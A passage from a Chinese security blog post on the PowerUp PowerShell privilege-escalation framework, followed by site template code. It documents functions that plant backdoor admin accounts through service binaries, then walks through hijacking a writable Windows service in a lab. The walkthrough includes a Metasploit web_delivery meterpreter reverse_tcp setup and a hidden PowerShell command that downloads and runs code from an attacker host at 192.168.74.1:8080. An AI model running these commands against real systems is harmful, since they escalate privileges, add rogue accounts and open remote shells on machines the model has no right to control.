+<p><strong>Write-UserAddMSI</strong><br>生成一个安装文件，运行这个安装文件，则弹出添加用户的框。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Write</span>-UserAddMSI</span><br></pre></td></tr></table></figure></p>
+<p><strong>Write-ServiceBinary</strong><br>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令。<br>执行方式：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="keyword">Write</span>-ServiceBinary -ServiceName VulnSVC <span class="comment"># 添加默认账号</span></span><br><span class="line">PS C:\&gt; <span class="keyword">Write</span>-ServiceBinary -ServiceName VulnSVC -UserName <span class="string">"TESTLAB\john"</span> <span class="comment"># 指定添加域账号</span></span><br><span class="line">PS C:\&gt; <span class="keyword">Write</span>-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! <span class="comment"># 指定添加用户，用户密码以及添加的用户组。</span></span><br><span class="line">PS C:\&gt; <span class="keyword">Write</span>-ServiceBinary -ServiceName VulnSVC -Command <span class="string">"net ..."</span> <span class="comment"># 自定义执行命令</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>Install-ServiceBinary</strong><br>通过Write-ServiceBinary写一个C#的服务用来添加用户。<br>执行方式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Install</span>-ServiceBinary -ServiceName DHCP</span><br><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Install</span>-ServiceBinary -ServiceName VulnSVC -UserName <span class="string">"TESTLAB\john"</span></span><br><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Install</span>-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!</span><br><span class="line">PS <span class="keyword">C</span>:\&gt; <span class="keyword">Install</span>-ServiceBinary -ServiceName VulnSVC -Command <span class="string">"net ..."</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p><code>Write-ServiceBinary</code>与<code>Install-ServiceBinary</code>不同的是前者生成可执行文件，后者直接安装服务。</p>
+</blockquote>
+<h2 id="0x02-实战提权"><a href="#0x02-实战提权" class="headerlink" title="0x02 实战提权"></a>0x02 实战提权</h2><p>测试环境为win10。平常用的虚拟机，并没有特意去配置存在漏洞的环境，所以并不是所有的模块均可以使用。实际测试可以根据实际环境来调整。此次测试并未使用内核漏洞来提权。<br>首先添加低权限测试账号，使用管理员身份运行cmd，添加测试账号：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net<span class="built_in"> user </span>powerup 1 /add</span><br></pre></td></tr></table></figure></p>
+<p>查看powerup账号权限：<br><img src="https://evi1cg.github.io/usr/uploads/2016/01/1878968638.png" alt="1452144979247.png"></p>
+<p>使用powerup账号登陆系统，加载Powerup：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/851829458.png" alt="1452145506403.png"></p>
+<p>执行Invoke-AllChecks:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">E:</span>\&gt; Invoke-AllChecks</span><br></pre></td></tr></table></figure></p>
+<p>执行以后找到下列问题：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[*] Checking for unquoted service paths...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServiceName   : CDROM_Detect</span><br><span class="line">Path          : C:<span class="symbol">\P</span>rogram Files<span class="symbol">\4</span>G USB Modem<span class="symbol">\4</span>G_Eject.exe</span><br><span class="line">StartName     : LocalSystem</span><br><span class="line">AbuseFunction : Write-ServiceBinary -ServiceName 'CDROM_Detect' -Path &lt;HijackPath&gt;</span><br><span class="line"></span><br><span class="line">ServiceName   : hMailServer</span><br><span class="line">Path          : C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\h</span>MailServer<span class="symbol">\B</span>in<span class="symbol">\h</span>MailServer.exe RunAsService</span><br><span class="line">StartName     : LocalSystem</span><br><span class="line">AbuseFunction : Write-ServiceBinary -ServiceName 'hMailServer' -Path &lt;HijackPath&gt;</span><br><span class="line"></span><br><span class="line">[*] Checking service executable and argument permissions...</span><br><span class="line"></span><br><span class="line">ServiceName    : wampapache</span><br><span class="line">Path           : "c:<span class="symbol">\w</span>amp<span class="symbol">\b</span>in<span class="symbol">\a</span>pache<span class="symbol">\a</span>pache2.2.17<span class="symbol">\b</span>in<span class="symbol">\h</span>ttpd.exe" -k runservice</span><br><span class="line">ModifiableFile : c:<span class="symbol">\w</span>amp<span class="symbol">\b</span>in<span class="symbol">\a</span>pache<span class="symbol">\a</span>pache2.2.17<span class="symbol">\b</span>in<span class="symbol">\h</span>ttpd.exe</span><br><span class="line">StartName      : LocalSystem</span><br><span class="line">AbuseFunction  : Install-ServiceBinary -ServiceName 'wampapache'</span><br><span class="line"></span><br><span class="line">ServiceName    : wampmysqld</span><br><span class="line">Path           : c:<span class="symbol">\w</span>amp<span class="symbol">\b</span>in<span class="symbol">\m</span>ysql<span class="symbol">\m</span>ysql5.5.8<span class="symbol">\b</span>in<span class="symbol">\m</span>ysqld.exe wampmysqld</span><br><span class="line">ModifiableFile : c:<span class="symbol">\w</span>amp<span class="symbol">\b</span>in<span class="symbol">\m</span>ysql<span class="symbol">\m</span>ysql5.5.8<span class="symbol">\b</span>in<span class="symbol">\m</span>ysqld.exe</span><br><span class="line">StartName      : LocalSystem</span><br><span class="line">AbuseFunction  : Install-ServiceBinary -ServiceName 'wampmysqld'</span><br></pre></td></tr></table></figure></p>
+<p>可以看出，Powerup列出了可能存在问题的服务，并在AbuseFunction中给了接下来的利用方式。在上面两个利用点可以看出，<code>unquoted service paths</code>中给出了两个路径带空格的文件路径，但是因为其在c盘，没有权限，所以并不能被我们利用来提权。而第二个检查通过<code>Get-ServiceFilePermission</code>找到两个当前用户可以写入相关联可执行文件的路径，我们就可以通过这个来进行提权。在AbuseFunction那里已经给了我们操作方式，接下来我们执行如下操作：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">E</span>:\&gt; <span class="keyword">Install</span>-ServiceBinary -ServiceName <span class="string">'wampapache'</span> -UserName rockyou -Password <span class="number">123</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1897269880.png" alt="1452146595860.png"></p>
+<p>之后当管理员运行该服务的时候，则会添加我们的账号，运行前：<br><img src="https://evi1cg.github.io/usr/uploads/2016/01/2301472208.png" alt="1452146708021.png"></p>
+<p>运行服务以后：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1920271330.png" alt="1452146786160.png"></p>
+<p>查看该账号权限：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1190301204.png" alt="1452146836337.png"></p>
+<p>当然，除了添加账号，我们同样可使用msf获得meterpreter会话。<br>使用web_delivery 模块开启监听：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf exploit(web_delivery) &gt; <span class="keyword">set</span> URIPATH /</span><br><span class="line">URIPATH =&gt; /</span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set lport 8888</span></span><br><span class="line">lport <span class="comment">=&gt; 8888</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set target 2</span></span><br><span class="line">target <span class="comment">=&gt; 2</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set SRVPORT 8080</span></span><br><span class="line">SRVPORT <span class="comment">=&gt; 8080</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set LHOST 192.168.74.1</span> </span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; exploit</span></span><br></pre></td></tr></table></figure></p>
+<p>执行如下命令：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS</span> E:\&gt; Install-ServiceBinary -ServiceName <span class="string">'wampapache'</span> -Command <span class="string">"powershell.exe -nop -w hidden -c `<span class="variable">$m</span>=new-object net.webclient;`<span class="variable">$m</span>.proxy=[Net.WebRequest]::GetSystemWebProxy();`<span class="variable">$m</span>.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `<span class="variable">$m</span>.downloadstring('http://192.168.74.1:8080/');"</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>要注意 <code>$</code> 符号前面要加 ` 来转义</p>
+</blockquote>
+<p>当管理员运行此服务以后则获取高权限的meterpreter会话</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/3237295859.png" alt="1452148999764.png"></p>
+<p>提权以后，使用<code>Restore-ServiceBinary</code> 恢复文件：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="string">E:</span>\&gt; Restore-ServiceBinary -ServiceName <span class="string">'wampapache'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/01/1008699184.png" alt="1452147105370.png"></p>
+<p>可以看到，我们使用powerup成功提权了。当然碰到实际的环境可以根据不同环境不同方式来进行提权。</p>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>Powerup提供了一些我们并不常见的提权方式，并且为我们的Windows提权提供了极大的方便，如果碰到未安装Powershell的计算机，可以详细参考Powerup里面的函数实现过程来通过别的方式来实现同样的效果，希望本文对你有帮助。</p>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/Powerup.html" title="Powrshell 提权框架-Powerup">https://evi1cg.github.io/archives/Powerup.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Powershell/" rel="tag"># Powershell</a>
+          
+            <a href="/tags/powerup/" rel="tag"># powerup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/phpcodes.html" rel="next" title="最短php一句话">
+                <i class="fa fa-chevron-left"></i> 最短php一句话
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/Cortana.html" rel="prev" title="强化你的Cobalt strike之Cortana">
+                强化你的Cobalt strike之Cortana <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-使用"><span class="nav-number">1.</span> <span class="nav-text">0x00 使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-模块介绍"><span class="nav-number">2.</span> <span class="nav-text">0x01 模块介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-实战提权"><span class="nav-number">3.</span> <span class="nav-text">0x02 实战提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-小结"><span class="nav-number">4.</span> <span class="nav-text">0x04 小结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
